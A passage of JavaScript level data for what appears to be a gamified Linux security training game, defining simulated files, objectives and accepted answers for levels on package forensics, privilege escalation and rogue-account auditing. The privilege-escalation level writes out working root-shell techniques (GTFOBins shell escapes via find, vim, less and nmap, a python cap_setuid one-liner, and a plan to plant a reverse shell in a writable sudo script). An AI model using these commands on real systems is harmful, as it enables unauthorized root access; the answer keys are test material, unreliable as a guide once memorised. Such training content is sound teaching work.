║   /var/log/apt/history.log   # APT history                    ║
║   grep " install " dpkg.log  # Find installs                  ║
║   grep " remove " dpkg.log   # Find removals                  ║
║                                                               ║
║ VERIFY INTEGRITY:                                             ║
║   dpkg -V <package>          # Verify package files           ║
║   debsums <package>          # Checksum verification          ║
║   apt-get --reinstall        # Reinstall corrupted package    ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/analyst/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
                    content: '# Analyst shell config\nexport PS1="[analyst@FORENSIC-WS \\W]$ "\nalias pkglist="dpkg -l | grep ^ii"\nalias recentpkgs="grep install /var/log/dpkg.log | tail -20"'
                },
                '/home/analyst/package_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['baseline.txt', 'current.txt', 'diff.txt', 'README.txt']
                },
                '/home/analyst/package_audit/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `PACKAGE AUDIT WORKSPACE
=======================
Incident: IR-2026-0119
Target: Production Web Server

baseline.txt - Known good packages from golden image
current.txt  - Current package list from compromised host
diff.txt     - Differences found (REVIEW CAREFULLY)

Analyst Notes:
- Compare packages to find unauthorized installations
- Check dpkg.log for installation timestamps
- Verify package integrity with dpkg -V`
                },
                '/home/analyst/package_audit/baseline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `BASELINE PACKAGE LIST - Golden Image v3.1
==========================================
ii  apache2           2.4.54    amd64   Apache HTTP Server
ii  bash              5.1-6     amd64   GNU Bourne Again Shell
ii  coreutils         8.32-4    amd64   GNU core utilities
ii  curl              7.81.0    amd64   Command line URL tool
ii  dpkg              1.21.1    amd64   Debian package manager
ii  grep              3.7-1     amd64   GNU grep
ii  libc6             2.35-0    amd64   GNU C Library
ii  libssl3           3.0.2-0   amd64   SSL shared libraries
ii  mysql-client      8.0.32    amd64   MySQL client
ii  nginx             1.22.1    amd64   HTTP and reverse proxy
ii  openssh-server    8.9p1     amd64   Secure shell server
ii  openssl           3.0.2-0   amd64   SSL toolkit
ii  php8.1            8.1.12    amd64   PHP interpreter
ii  rsync             3.2.3-8   amd64   Fast file copy
ii  tar               1.34-1    amd64   GNU tar
ii  vim               8.2.3995  amd64   Vi IMproved
ii  wget              1.21.2    amd64   Network downloader`
                },
                '/home/analyst/package_audit/current.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2560,
                    content: `CURRENT PACKAGE LIST - Compromised Host
========================================
ii  apache2           2.4.54    amd64   Apache HTTP Server
ii  bash              5.1-6     amd64   GNU Bourne Again Shell
ii  coreutils         8.32-4    amd64   GNU core utilities
ii  curl              7.81.0    amd64   Command line URL tool
ii  dpkg              1.21.1    amd64   Debian package manager
ii  grep              3.7-1     amd64   GNU grep
ii  htop              3.2.1     amd64   Interactive process viewer
ii  libc6             2.35-0    amd64   GNU C Library
ii  libssl3           3.0.2-0   amd64   SSL shared libraries
ii  mysql-client      8.0.32    amd64   MySQL client
ii  ncat              7.93      amd64   Nmap network tool <<<SUSPICIOUS
ii  netminer          0.9.7     amd64   Network utility <<<UNKNOWN
ii  nginx             1.22.1    amd64   HTTP and reverse proxy
ii  openssh-server    8.9p1     amd64   Secure shell server
ii  openssl           3.0.2-0   amd64   SSL toolkit
ii  php8.1            8.1.12    amd64   PHP interpreter
ii  rsync             3.2.3-8   amd64   Fast file copy
ii  socat             1.7.4.1   amd64   Multipurpose relay <<<SUSPICIOUS
ii  tar               1.34-1    amd64   GNU tar
ii  vim               8.2.3995  amd64   Vi IMproved
ii  wget              1.21.2    amd64   Network downloader`
                },
                '/home/analyst/package_audit/diff.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
                    content: `PACKAGE DIFFERENCES DETECTED
============================
Analysis Date: 2026-01-19

PACKAGES ADDED (not in baseline):
+ htop       3.2.1    - Process viewer (legitimate?)
+ ncat       7.93     - Netcat variant (SUSPICIOUS - data exfil tool)
+ netminer   0.9.7    - UNKNOWN PACKAGE (investigate immediately)
+ socat      1.7.4.1  - Relay tool (SUSPICIOUS - tunnel capability)

PACKAGES REMOVED:
(none)

PACKAGES MODIFIED:
(none)

PRIORITY: Investigate 'netminer' - not in any known repository
ACTION: Check /var/log/dpkg.log for installation timestamp`
                },
                '/home/analyst/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['analysis_template.txt', 'findings_draft.txt']
                },
                '/home/analyst/reports/analysis_template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `FORENSIC PACKAGE ANALYSIS REPORT
=================================
Case ID:
Analyst:
Date:

1. UNAUTHORIZED PACKAGES FOUND:
   -

2. INSTALLATION TIMELINE:
   -

3. PACKAGE INTEGRITY ISSUES:
   -

4. RECOMMENDATIONS:
   - `
                },
                '/home/analyst/reports/findings_draft.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
                    content: `PRELIMINARY FINDINGS
====================
The package 'netminer' appears to be the primary malware.

Key observations:
- Not found in official Debian/Ubuntu repositories
- Installed from local .deb file (see dpkg.log)
- Package description claims "network utility" but...
- Version 0.9.7 - low version suggests custom build

TODO: Get full details with dpkg -s netminer`
                },
                '/home/analyst/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['captured_deb.txt', 'hash_values.txt']
                },
                '/home/analyst/evidence/captured_deb.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
                    content: `CAPTURED EVIDENCE
=================
File: netminer_0.9.7_amd64.deb
Location: /tmp/ (since deleted)
MD5: a1b2c3d4e5f6...

Package control file showed:
Maintainer: shadow@darknet.local
Description: Network data extraction utility`
                },
                '/home/analyst/evidence/hash_values.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 384,
                    content: `HASH VALUES FOR EVIDENCE
========================
baseline.txt    MD5: 3d4f5a6b7c8d9e0f...
current.txt     MD5: 9a8b7c6d5e4f3a2b...
dpkg.log        MD5: f1e2d3c4b5a6...

Malware Package:
netminer deb    MD5: a1b2c3d4e5f6...
netminer binary SHA256: 7f8e9d0c1b2a3...`
                },
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['dpkg.log', 'apt']
                },
                '/var/log/dpkg.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 4096,
                    content: `2026-01-10 08:15:22 startup packages configure
2026-01-10 08:15:23 configure libc6:amd64 2.35-0 <none>
2026-01-10 08:15:24 status installed libc6:amd64 2.35-0
2026-01-12 14:30:01 install htop:amd64 <none> 3.2.1
2026-01-12 14:30:02 status installed htop:amd64 3.2.1
2026-01-15 02:47:33 install ncat:amd64 <none> 7.93
2026-01-15 02:47:34 status installed ncat:amd64 7.93
2026-01-15 02:48:15 install socat:amd64 <none> 1.7.4.1
2026-01-15 02:48:16 status installed socat:amd64 1.7.4.1
2026-01-15 02:51:07 install netminer:amd64 <none> 0.9.7
2026-01-15 02:51:08 status installed netminer:amd64 0.9.7
2026-01-17 09:00:01 upgrade openssl:amd64 3.0.2-0 3.0.2-1
2026-01-17 09:00:02 status installed openssl:amd64 3.0.2-1
2026-01-18 11:22:45 startup packages configure`
                },
                '/var/log/apt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['history.log']
                },
                '/var/log/apt/history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 1024,
                    content: `Start-Date: 2026-01-12  14:30:00
Commandline: apt install htop
Install: htop:amd64 (3.2.1)
End-Date: 2026-01-12  14:30:03

Start-Date: 2026-01-15  02:47:30
Commandline: dpkg -i /tmp/toolkit.deb
Install: ncat:amd64 (7.93), socat:amd64 (1.7.4.1)
End-Date: 2026-01-15  02:48:20

Start-Date: 2026-01-15  02:51:00
Commandline: dpkg -i /tmp/netminer_0.9.7_amd64.deb
Install: netminer:amd64 (0.9.7)
End-Date: 2026-01-15  02:51:10`
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)',
                  check: (cmd, state, output) => (cmd.includes('dpkg') && cmd.includes('-l')) || (cmd.includes('apt') && cmd.includes('list')) &&
                         output && (output.includes('ii') || output.includes('installed')) },
                { id: 2, task: 'SEARCH: Suspicious Package', hint: '$ dpkg -l | grep netminer',
                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('grep') &&
                         output && (output.includes('netminer') || output.includes('ncat') || output.includes('socat')) },
                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s netminer',
                  check: (cmd, state, output) => cmd.includes('dpkg') && cmd.includes('-s') &&
                         output && (output.includes('Package:') || output.includes('Status:') || output.includes('Version:')) },
                { id: 4, task: 'FIND: Installation Timeline', hint: '$ grep " install " /var/log/dpkg.log',
                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('dpkg.log') &&
                         output && (output.includes('install') || output.includes('netminer')) },
                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V netminer (or dpkg -L)',
                  check: (cmd, state, output) => cmd.includes('dpkg') && (cmd.includes('-V') || cmd.includes('-L')) &&
                         output && output.length > 0 },
            ],

            insightPhase: {
                enabled: true,
                question: "At what time (HH:MM:SS) was the malicious 'netminer' package installed?",
                acceptedAnswers: ["02:51:07", "2:51:07", "02:51"],
                hint: "Check the dpkg.log for the exact timestamp when netminer was installed.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Timestamp format: HH:MM:SS - check dpkg.log entries carefully.",
                correctAnswerMessage: "TIMELINE CONFIRMED. 02:51:07 on January 15th - coordinated with other suspicious installs at 02:47-02:48."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-026: Access Control
        // Theme: Privilege escalation analysis
        // ──────────────────────────────────────────────────────────
        'CLH-026': {
            title: 'Access Control',
            description: 'Analyze access controls and find privilege escalation paths.',
            prerequisites: ['CLH-025'],
            tier: 'CLI Wraith',
            user: 'infiltrator',
            hostname: 'EMBASSY-SRV',
            startDir: '/home/infiltrator',
            allowedCommands: null,

            filesystem: {
                '/home/infiltrator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['privesc_notes', 'recon', 'exploits', '.bashrc', '.bash_history', '.privesc_cheatsheet']
                },
                '/home/infiltrator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `id
groups
whoami
find / -perm -4000 -type f 2>/dev/null
sudo -l
find / -perm -o+w -type f 2>/dev/null | head -20
getcap -r / 2>/dev/null
cat /etc/sudoers 2>/dev/null
ls -la /etc/shadow`
                },
                '/home/infiltrator/.privesc_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 1792,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║            PRIVILEGE ESCALATION CHEATSHEET                    ║
╠═══════════════════════════════════════════════════════════════╣
║ CURRENT CONTEXT:                                              ║
║   id                         # User ID, groups                ║
║   groups                     # Group memberships              ║
║   whoami                     # Current username               ║
║                                                               ║
║ SUID/SGID HUNTING:                                            ║
║   find / -perm -4000 2>/dev/null    # SUID files              ║
║   find / -perm -2000 2>/dev/null    # SGID files              ║
║   find / -perm -6000 2>/dev/null    # Both SUID+SGID          ║
║                                                               ║
║ SUDO ANALYSIS:                                                ║
║   sudo -l                    # What can I sudo?               ║
║   sudo -V                    # Sudo version (CVE check)       ║
║   cat /etc/sudoers           # Full sudo config (if readable) ║
║                                                               ║
║ WORLD-WRITABLE:                                               ║
║   find / -perm -o+w -type f 2>/dev/null  # Writable files     ║
║   find / -perm -o+w -type d 2>/dev/null  # Writable dirs      ║
║                                                               ║
║ CAPABILITIES:                                                 ║
║   getcap -r / 2>/dev/null    # Files with capabilities        ║
║   # Dangerous: cap_setuid, cap_setgid, cap_sys_admin          ║
║                                                               ║
║ COMMON PRIVESC PATHS:                                         ║
║   - SUID binaries (GTFOBins)                                  ║
║   - Sudo misconfigurations                                    ║
║   - Writable /etc/passwd                                      ║
║   - Cron jobs running as root                                 ║
║   - Capabilities on binaries                                  ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/infiltrator/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
                    content: '# Infiltrator shell config\nexport PS1="[infiltrator@EMBASSY-SRV \\W]$ "\nalias suidscan="find / -perm -4000 -type f 2>/dev/null"\nalias worldwrite="find / -perm -o+w -type f 2>/dev/null"'
                },
                '/home/infiltrator/privesc_notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt', 'README.txt']
                },
                '/home/infiltrator/privesc_notes/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `PRIVESC RECONNAISSANCE NOTES
============================
Operation: EMBASSY BREACH
Objective: Escalate from infiltrator -> root

Current Access Level: infiltrator (low-priv user)
Target: root access on EMBASSY-SRV

Strategy:
1. Enumerate SUID binaries
2. Check sudo permissions
3. Find world-writable files
4. Check for capabilities
5. Identify weakest path to root`
                },
                '/home/infiltrator/privesc_notes/suid_binaries.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 768,
                    content: `SUID BINARIES DISCOVERED
========================
Scan Date: 2026-01-19

STANDARD (expected):
/usr/bin/passwd         - Password change (normal)
/usr/bin/sudo           - Sudo binary (normal)
/usr/bin/su             - Switch user (normal)
/usr/bin/mount          - Mount filesystems (normal)
/usr/bin/ping           - ICMP ping (normal)

INTERESTING:
/usr/bin/find           - GTFOBins: find . -exec /bin/sh -p \\;
/usr/bin/vim            - GTFOBins: vim -c ':!/bin/sh'
/usr/local/bin/backup   - CUSTOM BINARY (investigate!)

PRIORITY TARGET: /usr/local/bin/backup
Reason: Custom binary, likely misconfigured
Action: Check with strings, ltrace, or run with test input`
                },
                '/home/infiltrator/privesc_notes/sudo_rules.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
                    content: `SUDO PERMISSIONS ANALYSIS
=========================
Output of sudo -l for infiltrator:

User infiltrator may run the following commands on EMBASSY-SRV:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log

ANALYSIS:
- python3 report.py: Check if report.py is writable!
- less auth.log: Can spawn shell with !sh

EXPLOITATION NOTES:
The 'less' command allows shell escape: press !sh while viewing`
                },
                '/home/infiltrator/privesc_notes/weak_perms.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
                    content: `WORLD-WRITABLE FILES FOUND
==========================
Scan: find / -perm -o+w -type f 2>/dev/null

CRITICAL:
/opt/scripts/report.py   - 0777 - JACKPOT! Python script we can sudo

HIGH RISK:
/var/tmp/cleanup.sh      - 0666 - Possibly cron executed
/tmp/session_data.txt    - 0777 - Temp file

LOW RISK:
/var/log/app.log         - 0666 - Just a log file
/tmp/.X11-unix/*         - 0777 - X11 sockets (normal)

EXPLOITATION PATH IDENTIFIED:
1. Modify /opt/scripts/report.py
2. Insert reverse shell or command
3. Run: sudo /usr/bin/python3 /opt/scripts/report.py
4. PROFIT: Root shell`
                },
                '/home/infiltrator/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['system_info.txt', 'users.txt', 'capabilities.txt']
                },
                '/home/infiltrator/recon/system_info.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `SYSTEM INFORMATION
==================
Hostname: EMBASSY-SRV
OS: Ubuntu 22.04 LTS
Kernel: 5.15.0-generic
Architecture: x86_64

Security Notes:
- AppArmor: enforcing
- SELinux: disabled
- Firewall: ufw active
- No AV detected`
                },
                '/home/infiltrator/recon/users.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
                    content: `USERS ON SYSTEM
===============
root:x:0:0:root:/root:/bin/bash
infiltrator:x:1001:1001::/home/infiltrator:/bin/bash
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false`
                },
                '/home/infiltrator/recon/capabilities.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
                    content: `LINUX CAPABILITIES SCAN
=======================
Command: getcap -r / 2>/dev/null

/usr/bin/python3.10 cap_setuid=ep   <<<CRITICAL!
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep

ANALYSIS:
python3.10 has cap_setuid capability set!
This means we can change our UID to 0 (root).

Exploitation:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
                },
                '/home/infiltrator/exploits': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['gtfobins_notes.txt', 'attack_plan.txt']
                },
                '/home/infiltrator/exploits/gtfobins_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
                    content: `GTFOBINS REFERENCE
==================
Source: https://gtfobins.github.io/

FIND (SUID):
find . -exec /bin/sh -p \\; -quit

VIM (SUID):
vim -c ':!/bin/sh'

LESS (SUDO):
sudo less /var/log/auth.log
!sh

PYTHON (SUID/SUDO/CAPABILITIES):
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

NMAP (SUID, old versions):
nmap --interactive
!sh`
                },
                '/home/infiltrator/exploits/attack_plan.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
                    content: `PRIVILEGE ESCALATION ATTACK PLAN
=================================
Operation: EMBASSY BREACH
Target: root access

MULTIPLE PATHS IDENTIFIED:

Path A - Python Capability (EASIEST):
   python3 cap_setuid -> instant root shell

Path B - Sudo + Writable Script:
   Modify report.py -> sudo python3 report.py

Path C - Sudo + Less Shell Escape:
   sudo less auth.log -> !sh

Path D - SUID Find:
   find . -exec /bin/sh -p \\; -quit

RECOMMENDATION: Path A (capability exploit)
Reason: Direct, no file modification needed`
                },
            },

            objectives: [
                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups',
                  check: (cmd, state, output) => (cmd.includes('id') || cmd.includes('groups') || cmd.includes('whoami')) &&
                         output && (output.includes('infiltrator') || output.includes('uid=') || output.includes('gid=')) },
                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
                         output && (output.includes('/usr/bin') || output.includes('suid') || output.includes('backup')) },
                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l',
                  check: (cmd, state, output) => cmd.includes('sudo') && cmd.includes('-l') &&
                         output && (output.includes('NOPASSWD') || output.includes('may run') || output.includes('python')) },
                { id: 4, task: 'FIND: World-Writable Files', hint: '$ find / -perm -o+w -type f 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && (cmd.includes('w') || cmd.includes('777')) &&
                         output && (output.includes('/opt') || output.includes('/tmp') || output.includes('writable')) },
                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('getcap') &&
                         output && (output.includes('cap_') || output.includes('python') || output.includes('setuid')) },
            ],

            insightPhase: {
                enabled: true,
                question: "Which binary has the cap_setuid capability that allows direct privilege escalation?",
                acceptedAnswers: ["python3", "python3.10", "/usr/bin/python3", "/usr/bin/python3.10", "python"],
                hint: "Check the capabilities.txt file in the recon directory, or run getcap to find binaries with dangerous capabilities.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Not quite. Look for a binary with cap_setuid=ep capability.",
                correctAnswerMessage: "CONFIRMED. Python3.10 has cap_setuid - instant root with: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-027: User Management
        // Theme: Managing user accounts post-compromise
        // ──────────────────────────────────────────────────────────
        'CLH-027': {
            title: 'User Management',
            description: 'Understand user management commands for persistence and cleanup.',
            prerequisites: ['CLH-026'],
            tier: 'CLI Wraith',
            user: 'admin',
            hostname: 'ADMIN-SRV',
            startDir: '/home/admin',
            allowedCommands: null,

            filesystem: {
                '/home/admin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_audit', 'scripts', 'evidence', '.bashrc', '.bash_history', '.user_mgmt_cheatsheet']
                },
                '/home/admin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 384,
                    content: `cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd admin
groups admin
cat /etc/group | grep sudo
passwd -S admin
chage -l admin
cat /etc/shells
grep -v nologin /etc/passwd
lastlog | head -20`
                },
                '/home/admin/.user_mgmt_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 1792,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              USER MANAGEMENT CHEATSHEET                       ║
╠═══════════════════════════════════════════════════════════════╣
║ LIST USERS:                                                   ║
║   cat /etc/passwd              # All users (full entry)       ║
║   cat /etc/passwd | cut -d: -f1    # Usernames only           ║
║   getent passwd                # All users via NSS            ║
║   compgen -u                   # Bash user completion list    ║
║                                                               ║
║ USER DETAILS:                                                 ║
║   getent passwd <user>         # Full passwd entry            ║
║   id <user>                    # UID, GID, groups             ║
║   finger <user>                # User info (if installed)     ║
║                                                               ║
║ GROUP MANAGEMENT:                                             ║
║   groups <user>                # Groups for user              ║
║   cat /etc/group               # All groups                   ║
║   getent group <group>         # Group members                ║
║   id -nG <user>                # Group names for user         ║
║                                                               ║
║ PASSWORD STATUS:                                              ║
║   passwd -S <user>             # Password status              ║
║   chage -l <user>              # Password aging info          ║
║   cat /etc/shadow              # Password hashes (root only)  ║
║                                                               ║
║ LOGIN SHELLS:                                                 ║
║   cat /etc/shells              # Valid login shells           ║
║   grep -v nologin /etc/passwd  # Users with login shells      ║
║   grep /bin/bash /etc/passwd   # Bash users                   ║
║                                                               ║
║ AUDIT COMMANDS:                                               ║
║   lastlog                      # Last login for all users     ║
║   last                         # Recent logins                ║
║   who                          # Currently logged in          ║
║   w                            # Who + what they're doing     ║
╚═══════════════════════════════════════════════════════════════╝`
                },
                '/home/admin/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
                    content: '# Admin shell config\nexport PS1="[admin@ADMIN-SRV \\W]$ "\nalias userlist="cat /etc/passwd | cut -d: -f1"\nalias shellcheck="grep -v nologin /etc/passwd"'
                },
                '/home/admin/user_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_list.txt', 'group_memberships.txt', 'suspicious_accounts.txt', 'README.txt']
                },
                '/home/admin/user_audit/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 384,
                    content: `USER AUDIT WORKSPACE
====================
Incident: IR-2026-0119
Task: Identify rogue user accounts

Files:
- user_list.txt: Current system users with notes
- group_memberships.txt: Privileged group memberships
- suspicious_accounts.txt: Accounts flagged for review

Priority: Find the backdoor account created by attacker
UID range 1000-65533 = regular users (investigate these)`
                },
                '/home/admin/user_audit/user_list.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `SYSTEM USERS AUDIT
==================
Account          UID    Shell           Status
-------          ---    -----           ------
root             0      /bin/bash       Normal (system)
daemon           1      /usr/sbin/nologin   Normal (system)
bin              2      /usr/sbin/nologin   Normal (system)
admin            1000   /bin/bash       Normal (legitimate admin)
svcaccount       1001   /bin/bash       Normal (service account)
developer        1002   /bin/bash       Normal (dev team)
s3rv1c3          1003   /bin/bash       SUSPICIOUS - odd naming
guest            1004   /usr/sbin/nologin   Disabled
mysql            27     /bin/false      Normal (database)
www-data         33     /usr/sbin/nologin   Normal (web server)`
                },
                '/home/admin/user_audit/group_memberships.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `PRIVILEGED GROUP MEMBERSHIPS
=============================
SUDO GROUP (can run sudo):
- admin
- s3rv1c3    <<< UNAUTHORIZED! Not in original list

DOCKER GROUP (container access):
- admin
- developer

WHEEL GROUP:
- admin

ADM GROUP (log access):
- admin
- svcaccount

WARNING: s3rv1c3 was added to sudo group on 2026-01-15
This account did not exist before the incident.`
                },
                '/home/admin/user_audit/suspicious_accounts.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 640,
                    content: `SUSPICIOUS ACCOUNTS IDENTIFIED
==============================
Account: s3rv1c3 (UID 1003)
Created: 2026-01-15 02:52:33
Shell: /bin/bash
Groups: s3rv1c3, sudo
Home: /home/s3rv1c3

RED FLAGS:
1. Leet-speak naming (evasion attempt)
2. Added to sudo group immediately
3. Created at 02:52 (same timeframe as malware)
4. No corresponding ticket or change request
5. Home directory contains .ssh with authorized_keys

RECOMMENDATION: Disable and investigate
Command: usermod -L s3rv1c3 && usermod -s /usr/sbin/nologin s3rv1c3`
                },
                '/home/admin/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['add_user.sh', 'audit_users.sh', 'disable_user.sh']
                },
                '/home/admin/scripts/add_user.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# Safe user creation script\n# Usage: ./add_user.sh username\n\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nuseradd -m -s /bin/bash "$1"\npasswd "$1"\necho "User $1 created"'
                },
                '/home/admin/scripts/audit_users.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 384,
                    content: '#!/bin/bash\n# User audit script\necho "=== USERS WITH LOGIN SHELLS ==="\ngrep -v nologin /etc/passwd | grep -v /bin/false\necho ""\necho "=== SUDO GROUP MEMBERS ==="\ngetent group sudo\necho ""\necho "=== RECENT LOGINS ==="\nlastlog | grep -v "Never logged in" | head -10'
                },
                '/home/admin/scripts/disable_user.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# Disable user account safely\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nusermod -L "$1"\nusermod -s /usr/sbin/nologin "$1"\necho "User $1 disabled"'
                },
                '/home/admin/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['passwd_snapshot.txt', 'shadow_hashes.txt', 'timeline.txt']
                },
                '/home/admin/evidence/passwd_snapshot.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 768,
                    content: `PASSWD FILE SNAPSHOT - 2026-01-19
==================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
developer:x:1002:1002:Developer:/home/developer:/bin/bash
s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
                },
                '/home/admin/evidence/shadow_hashes.txt': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 256,
                    content: `SHADOW ANALYSIS (hashes redacted)
==================================
s3rv1c3 password analysis:
- Hash type: $6$ (SHA-512)
- Last changed: 2026-01-15 (day of compromise)
- Expires: Never
- Account status: Active

NOTE: Password was set when account created
Likely a known credential for attacker access`
                },
                '/home/admin/evidence/timeline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `ACCOUNT CREATION TIMELINE
=========================
Correlated with dpkg.log and auth.log:

2026-01-15 02:47:33 - ncat installed
2026-01-15 02:48:15 - socat installed
2026-01-15 02:51:07 - netminer installed
2026-01-15 02:52:33 - s3rv1c3 account created  <<<
2026-01-15 02:52:45 - s3rv1c3 added to sudo group
2026-01-15 02:53:01 - SSH key added to s3rv1c3

CONCLUSION: Account created for persistent backdoor access
exactly 1 minute after malware installation.`
                },
                '/etc/passwd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 768,
                    content: `root:x:0:0:root:/root:/bin/bash
